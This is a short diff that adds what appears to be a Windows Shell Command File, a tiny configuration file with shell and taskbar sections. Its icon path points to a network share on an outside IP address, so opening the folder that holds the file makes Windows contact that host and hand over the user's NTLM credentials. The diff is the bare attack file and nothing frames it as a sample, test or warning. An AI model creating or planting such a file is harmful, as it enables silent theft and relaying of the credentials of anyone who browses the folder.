@@ -1,0 +1,5 @@
+[Shell]
+Command=2
+IconFile=\\192.168.49.93\alvin.ico
+[Taskbar]
+Command=ToggleDesktop
